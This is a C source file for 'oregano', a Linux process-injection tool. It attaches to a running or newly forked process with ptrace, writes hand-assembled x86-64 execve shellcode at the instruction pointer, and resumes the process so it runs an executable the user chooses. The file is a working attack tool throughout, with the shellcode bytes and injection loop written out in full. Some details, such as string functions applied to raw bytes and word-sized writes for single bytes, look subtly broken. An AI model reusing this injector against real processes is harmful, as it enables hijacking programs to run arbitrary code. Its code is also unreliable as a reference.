// oregano.c
// https://github.com/R-Rothrock/oregano

/*
 * MIT License
 *
 * Copyright (c) 2023 Roan Rothrock
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#define __OUTPUT__ // whether you want output
#define __DEBUG__  // whether you want _more_ output

#ifdef __DEBUG__
#  ifndef __OUTPUT__
#    define __OUTPUT__
#  endif
#  define DEBUG "\033[34m[+]\033[0m"
#endif

#ifdef __OUTPUT__
#  include<stdio.h>
#  define INFO "\033[32m[-]\033[0m"
#  define HELP(X) printf("OPTIONS: %s [PID/PATH] [EXECUTABLE]\n", X); exit(1);
#  define LOGO \
printf("\033[94m\n"); \
printf(" .ei88ie.\n"); \
printf(".fE'  'Gf\n"); \
printf("i8      8i\n"); \
printf("D8      8L\n"); \
printf("D8.    .8I\n"); \
printf(":GL    j8'\n"); \
printf(" 't8jj9t'reg@n0\n"); \
printf(" --------------\n"); \
printf("\033[32m : Author: Roan Rothrock\n : <roan.rothrock@hotmail.com>\n"); \
printf("\033[0m");
#endif

#define __GNU_SOURCE

#include<errno.h>
#include<stdlib.h>
#include<string.h>
#include<sys/ptrace.h> /* ptrace() */
#include<sys/reg.h> /* EIP, RIP */
#include<sys/types.h> /* pid_t, size_t */
#include<sys/wait.h> /* waitpid() */
#include<unistd.h>

// X64
#if defined(__x86_64)
#  define OFFSET -1
#  define IP_REG RIP
#  define PTR_T u_int64_t

static u_int8_t base_shellcode[] = {
  0x48, 0x31, 0xc0,                         // xor rax, rax
  0x48, 0x31, 0xff,                         // xor rdi, rdi
  0x48, 0x31, 0xf6,                         // xor rsi, rsi
  0x48, 0x31, 0xd2,                         // xor rdx, rdx
  0x48, 0x8d, 0x3d, 0x37, 0x10, 0x10, 0x10,	// lea rdi, [rip+0x10101025]
  0x48, 0x81, 0xef, 0x10, 0x10, 0x10, 0x10,	// sub rdi, 0x10101010
  0x48, 0x8d, 0x35, 0x29, 0x10, 0x10, 0x10, // lea rsi, [rip+0x10101029]
  0x48, 0x81, 0xee, 0x10, 0x10, 0x10, 0x10, // sub rsi, 0x10101010
  0x56,                                     // push rsi
  0x48, 0x89, 0xe6,                         // mov rsi, rsp
  0xb0, 0x3b,                               // mov al, 59 ; execve()
  0x0f, 0x05,                               // syscall
  0x48, 0x31, 0xc0,                         // xor rax,rax
  0xb0, 0x3c,                               // mov al, 60 ; exit()
  0x48, 0x31, 0xff,                         // xor rdi,rdi
  0x0f, 0x05                                // syscall
};

// X86
//#elif defined(__i836)
//#  define OFFSET -1
//#  define IP_REG EIP
//#  define PTR_T u_int32_t

//#elif defined(__aarch64__) // arm64
//#  define OFFSET 1
//#  define IP_REG RIP
//#  define PTR_T u_int64_t

//#elif defined(__arm__) // arm32
//#  define OFFSET 1
//#  define IP_REG EIP
//#  define PTR_T u_int32_t

#else
#  error unsupported architecture
#endif

u_int8_t child(char *pathname)
{
  //printf("Child is executing...");
  char *child_argv[] = {pathname, 0};
  char *child_envp[] = {0};
  int ret = execve(child_argv[0], child_argv, child_envp);
  exit(ret);
}

int attach(pid_t pid)
{
  int _;
  int ret = ptrace(PTRACE_ATTACH, pid);
  if(ret != 0)
  {
    return ret;
  }

  waitpid(pid, &_, 0);
  ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACEEXIT);

  return 0;
}

PTR_T get_ip_reg(pid_t pid)
{
  long ret = ptrace(PTRACE_PEEKUSER, pid, sizeof(long) * IP_REG);
  return (PTR_T) (ret + OFFSET);
}

int main(int argc, char *argv[])
{
  #ifdef __OUTPUT__
  LOGO;
  #endif

  int ret; // to be used again and again
  pid_t pid;
  char *pathname;

  if(argc == 3)
  {

    // handling argv[1]

    char *str;
    long nr = strtol(argv[1], &str, 10);

    if(strlen(str) == 0)
    {
      // argv[1] is PID
      pid = (pid_t)nr;
    } else
    {
      // argv[1] is pathname
      // fork() and get PID
      pid = fork();

      if(pid == 0)
      {
        child(argv[1]);
      }
    }

    // handling argv[2]
    pathname = argv[2];

  } else
  {
    HELP(argv[0]);
  }

  #ifdef __OUTPUT__
  printf("%s Child PID: %i\n", INFO, pid);
  #endif

  ret = attach(pid);
  if (ret != 0)
  {
    #ifdef __OUTPUT__
    printf("%s Failed to attach to process: %s\n", INFO, strerror(errno));
    #endif

    exit(1);
  }
  #ifdef __OUTPUT__
  printf("%s Attached to process %i. Preparing shellcode.\n", INFO, pid);
  #endif

  // appending `pathname` to shellcode

  size_t shellcode_size = strlen(base_shellcode) + strlen(pathname);

  #ifdef __DEBUG__
  printf("%s Shellcode size: %i\n", DEBUG, shellcode_size);
  #endif

  u_int8_t shellcode[shellcode_size];
  strcpy(shellcode, base_shellcode);
  strcat(shellcode, pathname);

  #ifdef __DEBUG__
  printf("%s Shellcode: ", DEBUG);
  for(int i = 0; i < shellcode_size; i++)
  {
    if(i % 10 == 0)
    {
      printf("\n");
    }
    printf("0x%02x ", shellcode[i]);
  }
  printf("\n");
  #endif

  PTR_T ip = get_ip_reg(pid);

  #ifdef __DEBUG__
  printf("%s Instruction pointer (RIP/EIP): %p\n", DEBUG, ip);
  #endif

  #ifdef __OUTPUT__
  printf("%s Injecting shellcode...\n", INFO);
  #endif

  for(int i = 0; i < sizeof(shellcode); i++, ip++)
  {
    // too much output
    //#ifdef __DEBUG__
    //printf("%s 0x%02x  %c\t%p\n", DEBUG, shellcode[i], shellcode[i], ip);
    //#endif

    ptrace(PTRACE_POKETEXT, pid, ip, shellcode[i]);
  }

  #ifdef __OUTPUT__
  printf("%s Shellcode injected. Restarting process.\n", INFO);
  #endif

  ptrace(PTRACE_CONT, pid, 0, 0);

  int status;
  ret = waitpid(pid, &status, 0);

  #ifdef __OUTPUT__
  if(ret < 0)
  {
    printf("%s waitpid failed. Exiting...\n", INFO);
  } else
  if(ret == pid)
  {
    printf("%s Child exited. Exiting...\n", INFO);
  }
  #endif

  return 0;

}
